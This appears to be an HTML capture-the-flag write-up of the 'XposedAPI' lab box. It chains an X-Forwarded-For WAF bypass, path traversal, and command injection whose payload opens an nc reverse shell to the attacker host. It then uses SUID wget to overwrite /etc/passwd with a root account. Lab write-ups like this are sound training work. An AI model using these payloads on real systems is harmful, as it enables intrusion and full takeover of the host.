@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XposedAPI &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>XposedAPI</h1>
+    <div class="meta">Target: <code>192.168.176.134</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">WAFBypass</span><span class="tag">LFI</span><span class="tag">CommandInjection</span><span class="tag">SUID</span><span class="tag">wget</span><span class="tag">PasswdOverwrite</span><span class="tag">XForwardedFor</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#application-discovery">Application Discovery</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#waf-bypass-with-x-forwarded-for">WAF Bypass with X-Forwarded-For</a><a class="lvl3" href="#path-traversal-to-read-source-code">Path Traversal to Read Source Code</a><a class="lvl3" href="#command-injection-via-update">Command Injection via /update</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#suid-wget-to-overwrite-etc-passwd">SUID wget to Overwrite /etc/passwd</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>XposedAPI is a Linux box centered on a Flask-based "Remote Software Management API" that is intentionally misconfigured, it warns users it should not be externally accessible, and then proceeds to demonstrate why. The chain runs: WAF bypass via <code>X-Forwarded-For</code> header, path traversal through the <code>/logs</code> endpoint to read source code, command injection in the <code>/update</code> endpoint's URL parameter, and finally a SUID <code>wget</code> binary used to overwrite <code>/etc/passwd</code> and add a root-level user.</p>
+<h2 id="recon">Recon</h2>
+<p>The Nmap notes for this box were empty; the host and port are inferred from the HTTP notes. The application ran on port 13337.</p>
+<h3 id="application-discovery">Application Discovery</h3>
+<p>The root endpoint of the API served a self-documenting usage page:</p>
+<pre><code>Remote Software Management API
+
+Attention! This utility should not be exposed to external network.
+
+/            GET   Returns this page.
+/version     GET   Returns app version.
+/update      POST  Updates app using a linux executable. {&quot;user&quot;:&quot;&lt;user&gt;&quot;,&quot;url&quot;:&quot;&lt;url&gt;&quot;}
+/logs        GET   Read log files.
+/restart     GET   Restart the app.
+</code></pre>
+<p><code>/version</code> returned <code>1.0.0b8f887f...</code>. Visiting <code>/logs</code> returned:</p>
+<pre><code>WAF: Access Denied for this Host.
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="waf-bypass-with-x-forwarded-for">WAF Bypass with X-Forwarded-For</h3>
+<p>The application checks whether the request originates from localhost before serving the <code>/logs</code> endpoint. Adding <code>X-Forwarded-For: 127.0.0.1</code> to the request tricked the WAF into treating the external request as local:</p>
+<pre><code class="language-http">GET /logs HTTP/1.1
+Host: 192.168.176.134:13337
+X-Forwarded-For: 127.0.0.1
+</code></pre>
+<p>Response changed from 403 to 404:</p>
+<pre><code>Error! No file specified. Use file=/path/to/log/file to access log files.
+</code></pre>
+<blockquote>
+<p><strong>Why <code>X-Forwarded-For</code> bypasses application-level IP checks:</strong> reverse proxies use this header to pass the original client IP to the backend. When an application trusts this header without verifying it came from a known proxy, any client can forge it. Checking for <code>127.0.0.1</code> in <code>X-Forwarded-For</code> and assuming that means "localhost request" is a common mistake, the header is entirely attacker-controlled.</p>
+</blockquote>
+<h3 id="path-traversal-to-read-source-code">Path Traversal to Read Source Code</h3>
+<p>With the WAF bypassed, the <code>file=</code> parameter accepted traversal sequences:</p>
+<pre><code class="language-http">GET /logs?file=../../../etc/passwd HTTP/1.1
+X-Forwarded-For: 127.0.0.1
+</code></pre>
+<p><code>/etc/passwd</code> returned cleanly, revealing the only non-service user:</p>
+<pre><code>clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
+</code></pre>
+<p>Reading the application source at <code>/logs?file=../../../main.py</code> exposed the vulnerable code in the <code>/update</code> endpoint:</p>
+<pre><code class="language-python">os.system(&quot;curl {} -o /home/clumsyadmin/app&quot;.format(data['url']))
+</code></pre>
+<p>The <code>url</code> parameter is passed unsanitized into <code>os.system</code> via string formatting.</p>
+<h3 id="command-injection-via-update">Command Injection via /update</h3>
+<p>With the WAF bypassed using the same header, I sent a POST to <code>/update</code> with a semicolon-separated command appended to the URL value:</p>
+<pre><code class="language-http">POST /update HTTP/1.1
+Host: 192.168.176.134:13337
+X-Forwarded-For: 127.0.0.1
+Content-Type: application/json
+
+{
+    &quot;user&quot;:&quot;clumsyadmin&quot;,
+    &quot;url&quot;:&quot;http://192.168.45.244/test;nc 192.168.45.244 53 -e /bin/bash&quot;
+}
+</code></pre>
+<p>The server fetched <code>http://192.168.45.244/test</code> (returning 404) and then executed the <code>nc</code> command:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [192.168.45.244] from (UNKNOWN) [192.168.176.134] 41834
+whoami
+clumsyadmin
+</code></pre>
+<blockquote>
+<p><strong>How semicolon injection works in <code>os.system</code>:</strong> the shell interprets <code>;</code> as a command separator. <code>curl http://host/test;nc ...</code> runs <code>curl</code> first, then <code>nc</code>, regardless of whether <code>curl</code> succeeds. Python's <code>os.system</code> passes the entire string to <code>/bin/sh -c</code>, which processes the separator normally. Using <code>subprocess</code> with a list of arguments would have prevented this; string formatting into <code>os.system</code> never does.</p>
+</blockquote>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-wget-to-overwrite-etc-passwd">SUID wget to Overwrite /etc/passwd</h3>
+<p>SUID enumeration:</p>
+<pre><code class="language-sh">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt;/dev/null
+-rwsr-xr-x 1 root root 466496 Apr  5  2019 /usr/bin/wget
+</code></pre>
+<p><code>wget</code> with SUID root can write to any file on the filesystem, including <code>/etc/passwd</code>. I:</p>
+<ol>
+<li>Generated a password hash on Kali:</li>
+</ol>
+<pre><code class="language-sh">openssl passwd -1 -salt user3 ‹redacted›
+$1$user3$rAGRVf5p2jYTqtqOW5cPu/
+</code></pre>
+<ol>
+<li>Copied the target's <code>/etc/passwd</code> content and appended a new root-equivalent line:</li>
+</ol>
+<pre><code>user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash
+</code></pre>
+<ol>
+<li>Served the modified file and used SUID <code>wget</code> to overwrite <code>/etc/passwd</code>:</li>
+</ol>
+<pre><code class="language-sh">wget -O /etc/passwd http://192.168.45.244/passwd
+</code></pre>
+<ol>
+<li>Switched to the new user:</li>
+</ol>
+<pre><code class="language-sh">clumsyadmin@xposedapi:/$ su user3
+Password: ‹redacted›
+# whoami
+root
+</code></pre>
+<blockquote>
+<p><strong>Why SUID wget writes as root:</strong> the SUID bit causes the OS to run the binary with the file owner's effective UID (root here) regardless of who calls it. <code>wget -O /etc/passwd</code> is simply a file write, and as root, no file is off-limits. Overwriting <code>/etc/passwd</code> with a custom entry that has UID 0 creates a new root-equivalent account the attacker controls.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh"># cat /root/proof.txt
+‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> the proof.txt content block in the source notes was empty, the flag was captured but not recorded.</p>
+</blockquote>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Trust headers only from known proxies.</strong> <code>X-Forwarded-For</code> is attacker-controlled; using it to determine whether a request is "local" defeats the access control entirely.</li>
+<li><strong><code>os.system</code> with string formatting is always injectable.</strong> The semicolon separator is the oldest trick in shell injection. Use <code>subprocess</code> with argument lists.</li>
+<li><strong>SUID <code>wget</code> is a direct <code>/etc/passwd</code> overwrite primitive.</strong> GTFOBins documents this; any SUID file-writing binary can create arbitrary root-equivalent accounts.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
